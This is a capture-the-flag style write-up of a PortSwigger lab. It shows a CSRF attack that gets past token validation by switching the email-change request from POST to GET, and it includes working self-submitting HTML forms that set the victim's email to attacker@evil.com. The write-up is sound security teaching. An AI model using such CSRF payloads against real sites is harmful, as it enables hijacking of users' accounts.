# CSRF where token validation depends on request method

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-request-method), you'll learn: CSRF where token validation depends on request method! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.

To solve the lab, use your exploit server to host an HTML page that uses a [CSRF attack](https://portswigger.net/web-security/csrf) to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-2/images/Pasted%20image%2020221215003103.png)

**Login as user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-2/images/Pasted%20image%2020221215003134.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-2/images/Pasted%20image%2020221215003143.png)

**In the previous lab, we found that the email change functionality is vulnerable to CSRF.**

**Now we can inspect the form:**
```html
<form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required type="email" name="email" value="">
    <input required type="hidden" name="csrf" value="JMWikHWXdcNk0gmDyxXOhayb1J17hGXw">
    <button class='button' type='submit'> Update email </button>
</form>
```

**This time, the form also has a hidden CSRF token!**

**Now, we can use the `exploit server` to deliver the exploit to the victim:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-2/images/Pasted%20image%2020221215003505.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-2/images/Pasted%20image%2020221215003522.png)

**Let's try to craft a form that performs CSRF attack!**
```html
<html>
	<head>
		<title>CSRF-2</title>
	</head>
	<body>
		<form action="https://0ac8002903f73b0cc0c8c73c00e50044.web-security-academy.net/my-account/change-email" method="POST">
		    <input type="hidden" name="email" value="attacker@evil.com">
		</form>

		<script>
			document.forms[0].submit();
		</script>
	</body>
</html>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-2/images/Pasted%20image%2020221215003650.png)

**Now, we can click the `View exploit` to test the exploit locally:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-2/images/Pasted%20image%2020221215003719.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-2/images/Pasted%20image%2020221215003739.png)

**However, we can't modify our email address, as the form is missing the CSRF token!**

**To bypass the CSRF token, we can try to change our method from POST to GET:**
```html
<html>
	<head>
		<title>CSRF-2</title>
	</head>
	<body>
		<form action="https://0ac8002903f73b0cc0c8c73c00e50044.web-security-academy.net/my-account/change-email" method="GET">
		    <input type="hidden" name="email" value="attacker@evil.com">
		</form>

		<script>
			document.forms[0].submit();
		</script>
	</body>
</html>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-2/images/Pasted%20image%2020221215004136.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-2/images/Pasted%20image%2020221215004203.png)

**We've successfully changed our email address to attacker's controlled value!**

**Next, to change other users' email, we can click the `Deliver exploit to victim` button:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-2/images/Pasted%20image%2020221215004316.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-2/images/Pasted%20image%2020221215004328.png)

We did it!

# What we've learned:

1. CSRF where token validation depends on request method